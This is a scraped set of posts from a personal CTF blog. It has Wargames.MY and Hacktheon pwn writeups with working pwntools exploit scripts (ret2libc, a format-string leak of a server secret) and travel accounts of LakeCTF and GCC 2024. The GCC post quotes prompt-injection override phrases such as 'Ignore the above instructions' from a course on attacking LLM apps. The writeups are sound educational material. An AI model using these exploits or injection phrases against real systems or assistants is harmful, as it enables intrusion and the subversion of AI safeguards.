so we have to include them in our bytes calculation too.\nfrom pwn import * #io = process(\u0026#34;./dict\u0026#34;) io = remote(b\u0026#34;hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com\u0026#34;,26432) for i in range(25): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;Key \u0026gt;\u0026#34;,b\u0026#34;A\u0026#34;*(0x20-2)) io.sendlineafter(b\u0026#34;Value \u0026gt;\u0026#34;,b\u0026#34;B\u0026#34;*(0x80-2)) io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;Key \u0026gt;\u0026#34;,b\u0026#34;A\u0026#34;*(0x20-2)) io.sendlineafter(b\u0026#34;Value \u0026gt;\u0026#34;,b\u0026#34;B\u0026#34;*(0x40-3)) io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;Key \u0026gt;\u0026#34;,p32(0x31337)) io.sendlineafter(b\u0026#34;Value \u0026gt;\u0026#34;,b\u0026#34;pwn\u0026#34;) #gdb.attach(io) io.interactive() And that\u0026rsquo;s it for the writeups!\nThe challenges were pretty alright. I quite liked the interpreter 1 challenge (maybe cause we managed to solve it), but the difficulty for the two pwn challs might be a bit too low. There was another pwn chall that I didn\u0026rsquo;t write about and it had 0 solves, it was a hard C++ pwn chall that required you to exploit reference counting. So the jump of difficulty from the second pwn chall to the third was really huge.\nThere was also no crypto challs so our crypto player were just doing forensics lol.\nBut overall, the quality of the challs and infra was pretty good. Nice.\nExperience One of the best things about this trip is that I got to meet a lot of my friends that I\u0026rsquo;ve made in previous events! It was really fun seeing all of them for a second time (and third time for Faze), and catching up with everyone. I also got to make some new friends through them.\ngoing to ctf venue with team and SG friends\nThe hotel provided was really nice, and the organisers even provided us transport from Incheon Airport to Sejong. Everything went pretty smoothly so praise given to the organisers.\nBefore we went back to Malaysia, we also toured around myeongdong. We were just walking around the night streets, and we also visited a kpop store. Had quite a lot of fun.\nIt was pretty cool since I was just there last year when I went to Korea for codegate, and in my blog post about codegate, I wrote that I wished to go to more onsite finals. And now I\u0026rsquo;m here again because of another onsite final. So, pretty cool.\nConclusion Thanks so much to my teammates for making this a fun experience, and thanks again to the sponsors for making this trip possible. The organisers did a great job at providing everything, and were really easy to work with. Korea was also pretty nice, the food was pretty good, and everything is very clean.\nAlso thanks to all the friends I\u0026rsquo;ve met again there, hope we can meet up again soon!\nPhoto dump ","permalink":"https://zhirenliew.github.io/posts/hacktheon_24/","summary":"writeups for hacktheon finals and my experience at korea","title":"Hacktheon Sejong Finals 2024"},{"content":" Overview Last week, I traveled to Lausanne, Switzerland to play in LakeCTF'23 Finals with thehackerscrew. I had a lot of fun meeting my teammates and making new friends, and had a great time in Switzerland. It was a really long journey going there from Malaysia, but the experience was definetely worth it.\nLike my previous post, this isn\u0026rsquo;t going to be technical post, but instead a short blog about some of my experiences there. (I promise the next post is gonna be technical)\nThank you so much to RE:HACK for sponsoring my flights to Switzerland!\nÉcole polytechnique fédérale de Lausanne One of the main reasons I wanted to come to this ctf is because it took place in EPFL, which is currently one of the top engineering schools in the world. I actually plan to study and do engineering in the future, so I wanted to visit EPFL and see what an elite engineering school looks like.\nThe organisers of the ctfs, polyglots planned a short tour around the EPFL campus (which was huge), which involved touring around the SPOT, and the EPFL Data Centre.\nThe SPOT The SPOT (Student Prototyping and Outreach Tank) is EPFL\u0026rsquo;s Makerspace, and it is actually one of the coolest places I\u0026rsquo;ve ever seen.\nIt\u0026rsquo;s filled with really high tech machines used for making electronics, hardware, pcbs, printing, and pretty much anything you need to make anything you want. A lot of students were working on their projects there, ranging from bikes to rockets to rovers and it was super cool seeing them work. The environment just makes you feel inspired and innovative and kinda motivates you to work on your own projects there.\nEPFL Data Centre This is actually the first data centre I\u0026rsquo;ve ever visited, so that was cool. But it\u0026rsquo;s really just a data centre, so the insides are just filled with servers, and well, even more servers. (I mean, what did you expect?)\nBut the cool thing about this data centre is how environmental friendly it was, since it was covered with solar panels, and they actually redirect the heat produced by the servers to heat up the water that is pumped from the lake!\nPizza Party There was a pizza party after the tour, and they prepared club-mates!\nI remember hearing about club-mates in a LiveOverflow video before, and he said that it was associated with like german hacker culture or smthg, so it was really cool seeing one in real life!\nWe also got our lenyards and free shirts.\nThe CTF We managed to get 4th! Nice job by the team and it was overall quite fun. I solved 1 pwn and helped out around with the other pwns.\nThe challenges were quite nice, and there was this one really cool hardware pwn challenge solved by my teammate @Aali, which involved doing RISC-V ROP on an actual piece of hardware, and making the flag display on the screen.\nvideo of the flag\nThere was also tons of food prepared.\nThe Balelec Festival The Balelec Music Festival, which is the largest student ran musical event in Europe happened right after the ctf ended, and the ctf organisers were nice enough to get us all free tickets to the event.\nIt\u0026rsquo;s the first festival I\u0026rsquo;ve ever attended, and I had a really great time with my teammates! I didn\u0026rsquo;t understand anything that was being performed since it was all in French, but the music sounded nice and the food was great. Only thing was that I\u0026rsquo;m not used to the weather so I thought it was quite cold out there, which was a completely different experience than Malaysia.\nEOF After the CTF ended, I toured around Switzerland a bit and got to visit a few cool places (I visited CERN!), and I have to say, Switzerland is really beautiful, the views were just crazy good.\nThanks so much to the EPFL School of Computing and polygl0ts for organising this wonderful event, I had a really nice time. And thanks so much to my teammates for making this ctf so fun!\nPhoto dump ","permalink":"https://zhirenliew.github.io/posts/lakectf_finals23/","summary":"my experience attending lakectf finals at EPFL","title":"LakeCTF Finals 2023"},{"content":" Overview Last week, I alongside with 4 other Malaysians (Daus, Roheen, Jia Qi and Danisy) represented Malaysia as students to participate in GCC 2024 at Thailand.\nI had a really really really great time there, so I want to document and share some of my experiences through this blog. This isn\u0026rsquo;t really gonna be a technical blog, and is more gonna be a blog about my memories and fun experiences there.\nThe blog turned out quite long, sorry for yapping so much lol\nThank you so much to all the staff and sponsors from every country for making this event possible. I\u0026rsquo;m truly grateful to be able to have this once in a lifetime experience.\nDay 0 When we reached the Don Mueang International Airport, the GCC Thailand staff were waiting for us there with a piece of paper that had \u0026ldquo;GCC 2024 Team Malaysia\u0026rdquo; written on it, which tbh was pretty cool.\nWe then went to the hotel, checked in and then went up to our respective rooms. That was when I first met my amazing roomate Bau [TH] (Thank you so much for waking me up everytime I slept past my alarm 💀). The room was really spatious and clean, and had a really comfortable vibe to it.\nEveryone then met up at the lobby to attend the Ice Breaking Party. The staff gave us all Thailand souvenirs, and also a lenyard with a piece of paper for us to write our names on (This was a really good idea, made meeting new people and learning new names a lot easier).\nEvery country had to give an introduction on stage about all the students and staff during the ice breaking ceremony. It was really cool learning the backgrounds of everyone and seeing what people inside the room has accomplished.\nThere were people with CVEs, people with startups, people who attended DEFCON CTF Finals, just people who have achieved great things in hacking. And it was very exciting seeing all these talented people gathered in one place, and knowing that I\u0026rsquo;m gonna have the chance to spend a week interacting with them.\nAfter dinner, I went to the a local 7-11 with some friends and went to a small party in someone\u0026rsquo;s room.\nDay 1 Went to the meeting hall for the opening ceremony with my roomate, and this time we have to sit down according to our groups. So in GCC, students from different countries are arranged in groups as there will be groupwork assigned later on and we have to work together with our groupmates to complete the project and give a presentation later on.\nI was in Group 5, alongside with:\nRaj [IN] Josh [KR] Kevin [IDN] Nong [TH] Coincidentally, I was actually sitting beside Josh [KR] and his roomate, Sam [TH] during yesterday\u0026rsquo;s dinner, so I actually already talked with Josh quite a bit and was pretty happy he was in my group.\nThere was a class about Ethics, which for me was very interesting.\nThe instructor first talked about what was ethics, and introduced stuff like consequentialism, deontology and virtues, and then gave us topics about cybersecurity ethics for us to discuss among our group.\nPersonally, I felt that the discussions were really fun. I managed to get to know my groupmates through these discussions. I actually talked a lot to my groupmate, Raj [IN] during the discussions which made me a lot closer to him as I enjoyed talking with him quite a bit. The topics were really thought provoking and was just fun to think about.\nAfter that, groupwork was assigned to the groups. The topics were:\nAnalysis of OSINT feeds for Scams CVE and Exploit database CTF challanges Maltego plugin for analysis of mobile phone dumps The topic that our group got was \u0026ldquo;Analysis of OSINT feeds for Scams\u0026rdquo;. We initially wanted the CTF challanges topic (I\u0026rsquo;m pretty sure every group wanted that topic), but I guess we just have to deal with what we\u0026rsquo;re given.\nAfter lunch, team Singapore handed out GCC 2024 stickers (designed by Yao Xuan [SG]) as well as a super cool penguin circuit board (made by Manzel [SG]) which could play songs, but also had flags inside the board that we could capture. Thanks a lot to them!\nWe then had a training about Active Directory (AD) Attack Techniques.\nDeep Dive into Active Directory (AD) Attack Techniques I\u0026rsquo;ve never actually done any AD stuff before, so I kinda used this class to learn what AD was about. There were a lot of labs which made the training very interactive so that was rly nice.\nBut by the end of the training, everyone\u0026rsquo;s laptop were starting to sound like helicopter fans as 3 vms were needed to run at the same time for the training, lol.\nWe then had dinner and went back to the meeting hall to discuss about our groupwork. We were actually having trouble getting started as we weren\u0026rsquo;t necessarily sure what to do for our groupwork, we were deciding whether to make it a case study about an ongoing scam, or maybe make an OSINT tools wrapper that helps us automate the OSINT process. But in the end we just ended up looking for OSINT tools first, and was testing them out. Let\u0026rsquo;s leave the rest of the work for tmr :).\nThere was a party but I ended up going to bed early since I wanted to get enough sleep for tmr\u0026rsquo;s Fuzzing in the kernel world class, which was the class that I was most excited about alongside the Hands-on Car Hacking class.\nDay 2 The first training of the day was about Handling Threat Intelligence.\nHandling Threat Intelligence It was about blue teaming stuff which I also never really touched on before, so it was pretty cool learning about what happens on the other side of the exploit. There was a lab about using YARA to find malware on a machine which was actually quite fun. There was also another lab which was about finding compromised users on a VM network by analysing their login times and locations which was also pretty fun to do.\nAfter that was the Fuzzing in the kernel world class which I was super excited for.\nFuzzing in the kernel world Read More The class was given by Lisa [TW], who is actually a GCC 2020 alumni, and is actually a member of Balsn!\nWe started off by learning about how fuzzing works, what are seed queues, mutations, sanitizers, etc which were all very interesting. Despite being a pwn player, I haven\u0026rsquo;t actually done fuzzing myself yet so I learned a lot during this.\nThe instructor prepared servers on the cloud that we could ssh into for every group, so that was rly convenient since we didn\u0026rsquo;t have to setup anything locally.\nWe installed afl++, wrote a simple C program with abort calls and just fuzzed our own binary.\nThen we went on to fuzz a previous version of xpdf which was vulnerable, so we were actually doing fuzzing on real life software. Fuzzing using pdf files were pretty interesting to say the least.\nThe instructor then went on to teach about how virtualization works. Virtualization is key for kernel fuzzing since for userspace fuzzing, we can just rerun the binary when the process dies, but for kernel fuzzing, we can\u0026rsquo;t possibly just kill our own system for each run. So we have to virtualize the system and fuzz the kernel there.\nThere were familliar concepts like page tables, TLBs and page faults, but ngl there were also quite a bit of stuff that I didn\u0026rsquo;t rly understand and have to revisit soon. Still, I learned about concepts like shadow page tables and Instruction Set Architectures (ISAs) which were pretty interesting.\nFinally, we got to the kernel fuzzing part. We had to compile the linux kernel and write a vulnerable kernel module to be loaded into the kernel and fuzzed later using a fuzzer called Syzkaller. The instructor was teaching about how kernel fuzzing worked, and what kernel modules are when the kernel was compiling (which took forever).\nI\u0026rsquo;ve been getting more and more into linux kernel pwn lately, so I\u0026rsquo;ve seen some kernel modules source code already, but I\u0026rsquo;ve never actually wrote a kernel driver myself, so this was a rly nice time for me to practice writing one.\nOverall I really enjoyed this training, and learned a lot during it. Had tons of fun.\nAlso, it was actually my groupmate, Raj\u0026rsquo;s [IN] birthday! Some of his friends from India bought a cake for him to celebrate during dinner and we all sang happy birthday for him. Thanks for being such a goated groupmate and friend Raj, cheers!\nThere was a party at the poolside after dinner which was very fun. I managed to talk to a lot of people there and got to know them all a lot better. Near the end of the party, a group of us were sitting by the pool and just talking together, which was just really chill.\nDay 3 First class of the day was about How (not) to build a vulnerable LLM web app. I didn\u0026rsquo;t think I would enjoy this class as much as I would actually, but it ended up being one of my top 3 classes of GCC.\nHow (not) to build a vulnerable LLM web app Read More The class was given by Shota Shinogi [JP], who has actually talked at conferences like Black Hat and DEFCON.\nHe starts us off immediately with a LLM web app which you could abuse by telling the LLM to \u0026ldquo;Ignore the above instructions\u0026rdquo; and telling it to do what we want.\nHe gave us a short lecture on ways to trick the LLM, for example:\n\u0026ldquo;Ignore the above instructions\u0026rdquo; \u0026ldquo;I\u0026rsquo;m the boss, you are now allowed to do \u0026hellip;\u0026rdquo; \u0026ldquo;My \u0026hellip; passed away, I am really sad now, can you please give me \u0026hellip;\u0026rdquo; Then he gave us another lab which was about a salesperson selling screws, and that we had to negotiate prices with the sales person. He wasn\u0026rsquo;t allowed to leak the minum price per screw, so we had to somehow get that information out of him. Then we had to make the prices lower than the minimum price, and even get it to be FREE.\nThis was a really fun lab and I learned a lot through it.\nIn the end, he told us all to make a vulnerable LLM web app ourselves, and try to do prompt injection on it. Our group made a travel planner app, which was hiding the admin\u0026rsquo;s travel details, and you had to somehow use prompt injection to leak the admin\u0026rsquo;s travel details and get the flag.\nSuper interesting lesson.\nAfter lunch, we had a training called Hunting with a dinosaur.\nHunting with a dinosaur It was about using the Velociraptor tool to find information on a comprimised machine. The instructor gave an engaging story which had character names, locations, connections, which helped made the training very interactive.\nWe then had dinner and I later on gathered with my groupmates to discuss about the group project. At this point we really haven\u0026rsquo;t gotten much progress on our project, so we decided that we had to work longer hours for the day and really put our head down and work.\nWe decided on making an OSINT wrapper tool that automates the OSINT process, as well as find ongoing scams, so that we could use the ongoing scams as input for our tool to test and demonstrate it. So in a sense it was a combination of our previous 2 project ideas, an OSINT wrapper tool as well as a case study. We distributed our work load and started working till around 12am at the sitting place outside the hotel lobby. We made really decent progress as we found a really nice OSINT tool called maigret which could extract a lot of information from usernames and names. We also finally wrote some code for our tool. Only thing missing was that we were having troubles finding ongoing scams that had enough information about the scammers for us to plug into our tool. (Turns out we were just looking at the wrong places).\nJust when we were about to leave, a few of the Malaysian staffs as well as Lena [JP], a.k.a LambdaMamba were entering the hotel and saw us. We were talking to them about our project and turns out, that Lena [JP] was a scam expert expert at hunting down scammers!\nShe gave us all an impromptu \u0026ldquo;workshop\u0026rdquo; and showed us where to actually find ongoing scams, how to extract info from scam links as well as safely browse scam links. She also introduced us to her tool GrimScraper, which is used to take screenshots of the scam sites and store the source code of the scam sites for further analysis.\nReally gotta say thanks to Lena for teaching us so much about scams. The new knowledge helped us significantly for our group project. Go check out her website if you want to learn more abt malware analysis and scams!\nDay 4 Day 4 only had one training, which was the car hacking training.\nHands-On Car Hacking Read More The training was given by Kamel [JP]. And I just gotta say, Kamel is one the most goated, fun, charasmatic, smart, majestic teachers that I\u0026rsquo;ve ever had. He made the training incredibly fun and interactive and engaging and made it my favourite training from GCC 2024.\nHe started off by introducing car hacking, and how cars have been exploited before.\nThen he went on and taught us about bluetooth security, and gave us some labs about interacting with a bluetooth device that he set up. I was having troubles with connecting usb\u0026rsquo;s to my vbox vm at this point so I didn\u0026rsquo;t rly get to play around the lab at this point. Thankfully I solved the problem later on and could work on the CAN stuff.\nHe then taught us the basics of CAN, and setup CAN networks for the whole room, which you could connect to through a USB to CAN adapter board.\nThis gave us the ability to just write and dump messages to the network, and well obviously people wrote scripts to spam the entire network which was pretty funny.\nThe most fun that I had was definetely towards the end of the training, when he brought out a bluetooth infotainment system, and also a detached instrument cluster which was connected to the CAN network for us to play with.\nThe instrument cluster was meant for the other side of the room to play with first. But as there were problems pairing with the bluetooth of the infotainment system, I moved my laptop over to the table which had the instrument cluster.\nAt the time, my friend Anikait [IN] was already connected to the instrument cluster, and he brute forced all the arbitration ids to find the id that controlled the speedometer, so he could then control the speedometer by sending CAN signals.\nClick here to look at the video\nI promise its not malware I just dk how to embed videos inside here\nHe was then nice enough to hand the CAN wire to me and let me play with the instrument cluster, and I first made a windshield using the speedometer.\nClick here to look at the video\nI was then joined by my friends Slash [TW] and Toda [JP] and we managed use the same bruteforce technique to find the arbitration ids for a bunch of different controls. I specifically wanted to find the arbitration id that flashed a warning light and made a \u0026ldquo;beep\u0026rdquo; sound, so that I could spam the \u0026ldquo;beep\u0026rdquo; sound.\nWe managed to find it and well this is what we made in the end:\nClick here to look at the video\nToday was the last day of preparation before the groupwork presentation.\nSo me and my groupmates just worked till we finished everything. We made a plan, assigned jobs, finished the tooling, made slides, and finally found an ongoing scam with enough information for a case study thanks to my groupmate Kevin [IDN]!\nI bonded a lot with my groupmates through these nights of working for the group project, and I\u0026rsquo;m quite proud of what we ultimately made in the end, so really thanks to my groupmates for being so fun to work with.\nDay 5 There was a training about Practical Malware Analysis and .NET Reversing.\nPractical Malware Analysis and .NET Reversing They talked about how .NET works, .NET headers, IRs, and demonstrated analysis on real life malware. They made a ton of cool labs too, and even made a ctfd website.\nand ofc my guy Faze speedran the ctf\nThey gave us all certs for completing GCC training and gave every country an opportunity to say some closing words.\nThen was the groupwork presentation. My group ran out of time and didn\u0026rsquo;t manage to present all of our findings and content. I was fine with it but still I feel like 5 mins is too short to present the groupwork projects, but I guess part of the challange is to make the presentation short and sweet.\nIn the end, we managed to get in the top 4, which made us all quite hyped lol.\nGroup 9 ended up getting second and Group 8 (Faze\u0026rsquo;s group) got first! They absolutely deserved it as their projects were really well developed and they also had rly nice presentations. Congrats to them and hope they enjoy their Offsec prizes.\nWe then all had dinner together at some local restaurant near the sea, and most of us went to the night market together.\nAnd of course, we had a party after that at the hotel.\nI got super hungry after the party so I went to 7-11 with a few of my friends and got some cup noodles.\nEOF We checked out of the hotel, and went to do some sightseeing together.\nWent to a market, and looked at the sea for a bit.\nThen we said our goodbyes, and before I knew it, I was already back in Malaysia.\nConclusion This week flew by insanely fast. So many things happened in just a span of a week.\nI made so many cool friends, and talked to so many people. I learned a lot about new areas of cybersecurity and dived deeper into what I already knew.\nI made a lot of fun memories there and I\u0026rsquo;m not even exaggerating when I say it\u0026rsquo;s been one of the best weeks of my life.\nAgain, thanks so much to all the organisers involved, from travel to accomadation to trainings, everything went really smoothly and great.\nI\u0026rsquo;ve also reposted a few other blog posts by other GCC candidates on my twitter, so go ahead and check them out to see their pov of GCC!\nSorry for yapping so much in this post but this blog is really a way for me to remember this experience. I really tried to only write about the more interesting parts of my experience, but there is just too much to write about. Also, if you wish for me to make modifications to the blog, like maybe changing the hyperlink attached to your name, please do not hesitate to tell me.\nPhoto dump ","permalink":"https://zhirenliew.github.io/posts/gcc24/","summary":"my GCC 2024 experience at Chon Buri, Thailand","title":"Global Cybersecurity Camp 2024"},{"content":" Overview I played in Wargames.MY 2023 ctf as a solo player, and managed to get first blood on all three of the pwn challs, as well as solve 1 ppc chall. Wargames.MY is pretty much the most famous Malaysian ctf currently, and some of my Malaysian ctf friends were talking to me about it, so I decided to give it a try.\nAll attachments can be found here\nMagic Door (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/magic_door/magic_door\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) src.c void open_the_door(void){ int iVar1; char local_18 [12]; int local_c; initialize(); puts(\u0026#34;Welcome to the Magic Door !\u0026#34;); printf(\u0026#34;Which door would you like to open? \u0026#34;); __isoc99_scanf(\u0026#34;%11s\u0026#34;,local_18); getchar(); iVar1 = strcmp(local_18,\u0026#34;50015\u0026#34;); if (iVar1 == 0) { no_door_foryou(); } else { local_c = atoi(local_18); if (local_c == 50015) { magic_door(50015); } else { no_door_foryou(); } } return; } void magic_door(void){ undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_10 = 0; puts(\u0026#34;Congratulations! You opened the magic door!\u0026#34;); puts(\u0026#34;Where would you like to go? \u0026#34;); fgets((char *)\u0026amp;local_48,0x100,stdin); return; } There is an obvious buffer overflow in the magic_door function, and since stack canary is disabled, a simple ret2libc will allow us to get a shell pretty quickly.\nThe tricky part is actually getting to the magic_door function call.\nThe program first asks which door you would like to open, and exits if you enter 50015. However, the program later checks to see if the door you want to open is 50015, and exits if its not.\nSo in other words, you can\u0026rsquo;t enter 50015, but you HAVE to enter 50015.\nSo how can you get past that? Negative numbers!\nIn memory, negative integers are stored in two\u0026rsquo;s complement form.\nSo -1 would be stored as 0xffffffff, -2 would be stored as 0xfffffffe, and so on.\nSo essentially,\n-a in memory: 0x100000000 - a So if we want 50015 to be in local_c, one way is we can enter 50015, and the other is by entering -(0x100000000-50015), which is -4294917281. This is so that the two\u0026rsquo;s complement of 4294917281, which is 0x100000000-4294917281=50015, will be stored in memory!\nThis way, we can pass both checks and get into the magic_door function.\nTo learn more about negative numbers in memory, you can look at this liveoverflow video or read this wikipedia page\nAfter getting into the magic_door function, I just made a rop that leaks puts@got to leak libc, and then restart the program. Then I just used a ret2libc to get a shell.\nThe libc version that the server uses isn\u0026rsquo;t given in the handout, so in order to find it (so that I can accurately calculate function offsets correctly in my exploit), I leaked the puts@libc and printf@libc addresses on remote using puts@got and printf@got, and then used a libc database search to find the correct libc version\nexploit.py from pwn import * #io = process(\u0026#34;./magic_door\u0026#34;,aslr=False) io = remote(\u0026#34;13.229.222.125\u0026#34;,32837) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) # gadgets entry = p64(0x401190) popRdi = p64(0x401434) putsPlt = p64(0x4010e0) putsGot = p64(0x404018) ret = p64(0x401388) io.sendlineafter(b\u0026#34;Which door would you like to open?\u0026#34;,b\u0026#34;-4294917281\u0026#34;) # leak libc and restart binary rop = b\u0026#34;A\u0026#34;*0x48 rop += popRdi + putsGot + putsPlt + entry io.sendlineafter(b\u0026#34;Where would you like to go?\u0026#34;,rop) io.recv() libc.address = u64(io.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - libc.symbols[\u0026#34;puts\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) io.sendlineafter(b\u0026#34;Which door would you like to open?\u0026#34;,b\u0026#34;-4294917281\u0026#34;) # I have to add a ret gadget to my rop to make the stack 64 bit aligned to prevent the movaps issue # more on that here: https://ropemporium.com/guide.html rop = b\u0026#34;A\u0026#34;*0x48 rop += ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(b\u0026#34;Where would you like to go?\u0026#34;,rop) io.interactive() Pak Mat Burger (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burger\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c char * main(void){ int iVar1; char *secret; long in_FS_OFFSET; char local_3e [9]; char local_35 [10]; char name [12]; undefined local_1f [15]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); initialize(); secret = getenv(\u0026#34;SECRET_MESSAGE\u0026#34;); if (secret == (char *)0x0) { puts(\u0026#34;Error: SECRET_MESSAGE environment variable not set. Exiting...\u0026#34;); secret = (char *)0x1; } else { puts(\u0026#34;Welcome to Pak Mat Burger!\u0026#34;); printf(\u0026#34;Please enter your name: \u0026#34;); __isoc99_scanf(\u0026#34;%11s\u0026#34;,name); printf(\u0026#34;Hi \u0026#34;); printf(name); printf(\u0026#34;, to order a burger, enter the secret message: \u0026#34;); __isoc99_scanf(\u0026#34;%8s\u0026#34;,local_3e); iVar1 = strcmp(local_3e,secret); if (iVar1 == 0) { puts(\u0026#34;Great! What type of burger would you like to order? \u0026#34;); __isoc99_scanf(\u0026#34;%14s\u0026#34;,local_1f); getchar(); printf(\u0026#34;Please provide your phone number, we will delivered soon: \u0026#34;); secret = fgets(local_35,100,stdin); } else { puts(\u0026#34;Sorry, the secret message is incorrect. Exiting...\u0026#34;); secret = (char *)0x0; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return secret; } There are two obvious vulnerabilities here, a format string vuln, and a buffer overflow vuln. Let\u0026rsquo;s look at the rest of the program first to see what we\u0026rsquo;re dealing with.\nThe program first gets the secret from an environment variable SECRET_MESSAGE\nwhen testing locally, use export SECRET_MESSAGE=\u0026quot;...\u0026quot; to set the SECRET_MESSAGE environment variable\nLater on, the program asks for your name, and directly calls printf on it (this is where the format string vuln is). It then asks for the secret, and if you correctly input the secret, you get to write what type of burger you want, and your phone number (this is where the buffer overflow vuln is).\nSince we can control the first argument of a printf(.,.,.) call, it means that we can use \u0026quot;%1$p\u0026quot; to print the second arg, and \u0026quot;%2$p\u0026quot; to print the third arg, and so on and so forth\nSo let\u0026rsquo;s see what we can leak using the format string vuln by breaking at the printf call and looking at the arguments.\nI set the SECRET_MESSAGE env variable to \u0026ldquo;1337\u0026rdquo; locally\nBreakpoint 1, 0x000055555555542a in main () [ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x0 $rcx : 0x00007ffff7ea7a77 → 0x5177fffff0003d48 (\u0026#34;H=\u0026#34;?) $rdx : 0x0 $rsp : 0x00007fffffffe290 → 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) $rbp : 0x00007fffffffe2d0 → 0x0000000000000001 $rsi : 0x00007fffffffc170 → \u0026#34;Hi ase enter your name: \u0026#34; $rdi : 0x00007fffffffe2ad → 0x0000000000007025 (\u0026#34;%p\u0026#34;?) $rip : 0x000055555555542a → \u0026lt;main+182\u0026gt; call 0x555555555150 \u0026lt;printf@plt\u0026gt; $r8 : 0x3 $r9 : 0x0 $r10 : 0x00005555555560a8 → 0x0000000000206948 (\u0026#34;Hi \u0026#34;?) $r11 : 0x246 $r12 : 0x00007fffffffe3e8 → 0x00007fffffffe650 → \u0026#34;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burg[...]\u0026#34; $r13 : 0x0000555555555374 → \u0026lt;main+0\u0026gt; endbr64 $r14 : 0x0000555555557d50 → 0x0000555555555280 → \u0026lt;__do_global_dtors_aux+0\u0026gt; endbr64 $r15 : 0x00007ffff7ffd040 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 ────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x55555555541e \u0026lt;main+170\u0026gt; lea rax, [rbp-0x23] 0x555555555422 \u0026lt;main+174\u0026gt; mov rdi, rax 0x555555555425 \u0026lt;main+177\u0026gt; mov eax, 0x0 → 0x55555555542a \u0026lt;main+182\u0026gt; call 0x555555555150 \u0026lt;printf@plt\u0026gt; ↳ 0x555555555150 \u0026lt;printf@plt+0\u0026gt; endbr64 0x555555555154 \u0026lt;printf@plt+4\u0026gt; bnd jmp QWORD PTR [rip+0x2e25] # 0x555555557f80 \u0026lt;printf@got.plt\u0026gt; 0x55555555515b \u0026lt;printf@plt+11\u0026gt; nop DWORD PTR [rax+rax*1+0x0] 0x555555555160 \u0026lt;alarm@plt+0\u0026gt; endbr64 0x555555555164 \u0026lt;alarm@plt+4\u0026gt; bnd jmp QWORD PTR [rip+0x2e1d] # 0x555555557f88 \u0026lt;alarm@got.plt\u0026gt; 0x55555555516b \u0026lt;alarm@plt+11\u0026gt; nop DWORD PTR [rax+rax*1+0x0] ────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ──── printf@plt ( $rdi = 0x00007fffffffe2ad → 0x0000000000007025 (\u0026#34;%p\u0026#34;?), $rsi = 0x00007fffffffc170 → \u0026#34;Hi ase enter your name: \u0026#34;, $rdx = 0x0000000000000000 ) So since this is an x86_64 binary, we are following the x86_64 calling convention.\n1st arg: stored in rdi 2nd arg: stored in rsi 3rd arg: stored in rdx 4th arg: stored in rcx 5th arg: stored in r8 6th arg: stored in r9 7th,8th,9th,... arg: stored at the top of the stack to learn more abt this and also see how C programs work in assembly, watch this liveoverflow video\nSo looking at the gdb output, we can see that the secret is stored at the top of the stack, which can be accessed by accesing the 7th argument of the printf call. Since \u0026quot;%1$p\u0026quot; refers to the second argument, we can use \u0026quot;%6$s\u0026quot; to leak the secret.\nAfter connecting to the server and leaking the secret multiple times, it can be seen that the secret stays the same through all connections. So you just have to leak it once, and you won\u0026rsquo;t have to leak it again in your following exploits.\nthe secret is e31c8306 btw\nSo cool! Now we can leak the secret. Well, what else can we leak? Let\u0026rsquo;s continue examining the stack.\ngef➤ tele 0x00007fffffffe290 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 0x00007fffffffe2d0│+0x0040: 0x0000000000000001 ← $rbp 0x00007fffffffe2d8│+0x0048: 